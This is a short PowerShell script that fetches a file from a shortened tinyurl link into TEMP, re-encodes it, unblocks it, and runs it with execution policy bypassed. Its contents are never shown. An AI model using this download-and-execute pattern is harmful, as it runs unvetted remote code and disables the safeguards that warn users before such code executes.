$scriptUrl = "https://tinyurl.com/cpwrshell"
$localPath = "$env:TEMP\menu.ps1"

# Download the script
Invoke-WebRequest -Uri $scriptUrl -OutFile $localPath

# Force UTF-8 Encoding (Remove incorrect characters)
$scriptContent = Get-Content -Path $localPath -Raw -Encoding Byte
$utf8Content = [System.Text.Encoding]::UTF8.GetString($scriptContent)
$utf8Content | Set-Content -Path $localPath -Encoding utf8

# Unblock the script (prevents execution warnings)
Unblock-File -Path $localPath

# Execute the script
PowerShell -ExecutionPolicy Bypass -File $localPath
